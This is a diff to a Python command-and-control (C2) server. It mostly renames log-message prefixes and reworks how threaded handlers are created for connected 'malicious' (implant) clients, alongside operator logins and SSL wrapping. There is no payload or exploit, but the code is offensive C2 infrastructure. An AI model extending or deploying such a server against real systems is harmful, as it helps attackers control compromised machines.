@@ -74,7 +74,7 @@ else:
 ##Reference: https://realpython.com/python-logging/
 logging.basicConfig(level=logging.DEBUG)
 ## Change the path to the system path + a log folder/file somewhere
-logging.basicConfig(filename='server.log', filemode='a', format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', force=True, datefmt='%Y-%m-%d %H:%M:%S')
+logging.basicConfig(filename='server.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s', force=True, datefmt='%Y-%m-%d %H:%M:%S')
 if global_debug:
     logging.getLogger().addHandler(logging.StreamHandler())
     
@@ -158,7 +158,7 @@ class ServerSockHandler:
             self.server.bind(self.ADDR)
             ## A cleanup function incase of crash/on exit
             atexit.register(self.socket_cleanup)
-            logging.debug(f"[Server] Server started, and listening: {self.ADDR}")
+            logging.debug(f"[Server.start_server() ] Server started, and listening: {self.ADDR}")
 
             ## starting listener
             self.server.listen()
@@ -223,7 +223,7 @@ class ServerSockHandler:
                     print("Nothing recieved from client")
 
             except Exception as e:
-                logging.debug(f"No message, action, type, or id recieved. , error={e}")
+                logging.debug(f"[Server.connection_handler() ] No message, action, type, or id recieved. , error={e}")
                 print(traceback.format_exc())
 
         ##== The decision handler based on the client_type, which can be:
@@ -252,10 +252,10 @@ class ServerSockHandler:
                 ## I should capture these too and see whos hitting it
                 ## immediatly drop connection, and mayyyybe add to a blocklist, but you could lose legit clients that way
                 serversocket.close()
-                logging.debug("Recieved HTTP Request to C2 server... closing connection")
+                logging.debug("[Server.connection_handler() ] Recieved HTTP Request to C2 server... closing connection")
                 
             else:
-                logging.warning(f"Unexpected Connection from {self.client_remote_ip_port}. Action: {action} ")
+                logging.warning(f"[Server.connection_handler() ] Unexpected Connection from {self.client_remote_ip_port}. Action: {action} ")
                 serversocket.close()
 
 
@@ -269,7 +269,7 @@ class ServerSockHandler:
         ## Getting client id from the client, and the IP address
             ## this var is only used for printing info, not as any 'real' data
             self.client_remote_ip_port = f"{non_ssl_conn.getpeername()[0]}:{non_ssl_conn.getpeername()[1]}"
-            logging.debug(f"\n[{self.client_remote_ip_port} -> Server] [New Instance] Accepted Connection from: {self.client_remote_ip_port}")
+            logging.debug(f"\n[{self.client_remote_ip_port} -> Server] Accepted Connection from: {self.client_remote_ip_port}")
 
         # Wrapping socket into SSL socket
             ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
@@ -287,16 +287,16 @@ class ServerSockHandler:
                 - Old SSL or client does not support SSL
                 
             '''
-            logging.warning(f"[Server (server_ssl_handler)] SSL Cert Unkown {self.client_remote_ip_port}\n\t Error Message: {ssle}")
+            logging.warning(f"[Server.server_ssl_handler() ] SSL Cert Unkown {self.client_remote_ip_port}\n\t Error Message: {ssle}")
 
         except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
-            logging.warning(f"[Server (server_ssl_handler)] Client {self.client_remote_ip_port} disconnected")
+            logging.warning(f"[Server.server_ssl_handler() ] Client {self.client_remote_ip_port} disconnected")
             return False
         except FileNotFoundError as fnfe:
-            logging.debug(f"[Server (server_ssl_handler)] Missing a file, either .CRT or .KEY: {type(e)}")
+            logging.debug(f"[Server.server_ssl_handler() ] Missing a file, either .CRT or .KEY: {type(e)}")
 
         except Exception as e:
-            logging.debug(f"[Server (server_ssl_handler)] Unkown Error: {type(e)}")
+            logging.debug(f"[Server.server_ssl_handler() ] Unkown Error: {type(e)}")
             return False     
   
     def server_plaintext_handler(self) -> socket:
@@ -316,13 +316,13 @@ class ServerSockHandler:
             return non_ssl_conn
 
         except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
-            logging.warning(f"[Server (server_ssl_handler)] Client {self.client_remote_ip_port} disconnected")
+            logging.warning(f"[Server.server_plaintext_handler() ] Client {self.client_remote_ip_port} disconnected")
             return False
         except FileNotFoundError as fnfe:
-            logging.debug(f"[Server (server_ssl_handler)] Missing a file, either .CRT or .KEY: {type(e)}")
+            logging.debug(f"[Server.server_plaintext_handler()] Missing a file, either .CRT or .KEY: {type(e)}")
 
         except Exception as e:
-            logging.debug(f"[Server (server_ssl_handler)] Unkown Error: {type(e)}")
+            logging.debug(f"[Server.server_plaintext_handler()] Unkown Error: {type(e)}")
             return False
 
     def socket_cleanup(self):
@@ -357,11 +357,11 @@ class ServerSockHandler:
         
         except ValueError as e:
                     # If there is a value error, set the username and password to None
-            logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
+            logging.debug(f"[Server.userloginhandler() ] Value error with login, credentials probably passed wrong: {e}")
             return False
         except Exception as e:
                     # If there is any other exception, set the username and password to None
-            logging.debug(f"Unknown error with logon process: {e}")
+            logging.debug(f"[Server.userloginhandler() ] Unknown error with logon process: {e}")
             return  False
 
 
@@ -374,7 +374,7 @@ class ServerSockHandler:
                 ##== sending the a-ok on successful authentication
                 Comms.CommsHandler.send_msg(msg="0", conn=self.conn)
 
-                logging.debug(f"[Server (Logon)] Successful Logon from: {friendly_client_name}")
+                logging.debug(f"[Server.userloginhandler() ]  Successful Logon from: {friendly_client_name}")
                 # Add friendly client to current clients list
                 self.friendly_current_clients.append(friendly_client_name)
                             
@@ -421,40 +421,50 @@ class ServerSockHandler:
         try:
             id = response_from_client["general"]["client_id"]
         except KeyError as e:
-            logging.debug(f"Invalid login message format: {e}")
+            logging.debug(f"[Server.clientloginhandler()] Invalid login message format: {e}")
             return False
 
         if id is None:
-            logging.debug("Client ID is None")
+            logging.debug("[Server.clientloginhandler()] Client ID is None")
             return False
 
         try:
+
             # Construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
             client_name = "client_" + serversocket.getpeername()[0].replace(".", "_") + "_" + id
 
+
+            '''
+            Explanation: 
+                English Translation:
+                    If the client is not currently in the current client list, add it, and create a
+                    new ServerMaliciousClientHandler object for it.
+
+                    If it is, just call the client class instance from the dict (becuase it already exists), 
+                    and start a thread with the relevant details. (i.e. the response from the client, the current socket, and the id)
+
+            '''
             if client_name not in self.current_clients:
                 self.current_clients.append(client_name)
 
-            # Create a new malicious client handler instance and add it to the clients dict
-            self.clients[client_name] = ClientEngine.MaliciousClientHandler.ServerMaliciousClientHandler(
-                clientsocket=serversocket,
-                clientid=id
-            )
+                # Create a new malicious client handler instance and add it to the clients dict
+                self.clients[client_name] = ClientEngine.MaliciousClientHandler.ServerMaliciousClientHandler()
 
-            # Create a new thread for this client's communication
+            # Create a new thread for this client's communication.
+            # Passing the response from client, the socket, and the id. 
             threading.Thread(
                 target=self.clients[client_name].handle_client,
-                args=(response_from_client,)
-            ).start()
+                args=(response_from_client, serversocket, id)
+                ).start()
 
-            logging.debug(f"Server (clientloginhandler)] Client '{id}' accepted, new thread created")
+            logging.debug(f"[Server.clientloginhandler(): {id} ] Client '{id}' accepted, new thread created")
 
         except KeyError as e:
-            logging.debug(f"Missing key in login message: {e}")
+            logging.debug(f"[Server.clientloginhandler(): {id} ] Missing key in login message: {e}")
             return False
 
         except Exception as e:
-            logging.debug(f"Server (clientloginhandler)] Unknown Error: {e}")
+            logging.debug(f"[Server.clientloginhandler(): {id} ] Unknown Error: {e}")
             raise  # Let the exception propagate, don't return False
 
         return True
